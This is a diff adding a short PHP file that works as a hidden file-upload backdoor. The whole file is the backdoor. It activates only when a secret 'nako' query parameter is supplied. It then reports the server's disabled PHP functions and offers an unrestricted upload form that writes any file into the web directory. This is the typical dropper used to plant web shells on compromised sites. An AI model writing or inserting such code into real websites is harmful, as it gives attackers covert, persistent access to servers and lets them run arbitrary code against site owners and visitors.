@@ -1,0 +1,38 @@
+<?php
+if (isset($_GET["nako"])) {
+    echo "<style>
+        body {
+            background-color: #4CAF50;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        input[type='file'], input[type='submit'] {
+            padding: 10px;
+            font-size: 14px;
+            margin-top: 10px;
+            background-color: #FBC02D;
+            border: 1px solid #1976D2;
+        }
+        b {
+            color: #00B0FF;
+        }
+      </style>";
+    $disable_functions = @ini_get("disable_functions");
+    echo "<br>DisablePHP = " . htmlspecialchars($disable_functions) . "<br>";
+    echo "<form method='post' enctype='multipart/form-data'>";
+    echo "<input type='file' name='f' required>";
+    echo "<input type='submit' name='k' value='upload'><br>";
+    if (isset($_POST["k"]) && $_POST["k"] == "upload") {
+        if (isset($_FILES["f"]) && $_FILES["f"]["error"] == 0) {
+            $target_file = basename($_FILES["f"]["name"]);
+            if (move_uploaded_file($_FILES["f"]["tmp_name"], $target_file)) {
+                echo "<b>File " . htmlspecialchars($target_file) . " successfully uploaded</b><br>";
+            } else {
+                echo "<b>Failed upload</b><br>";
+            }
+        } else {
+            echo "<b>Nothing uploaded</b><br>";
+        }
+    }
+}
+?>
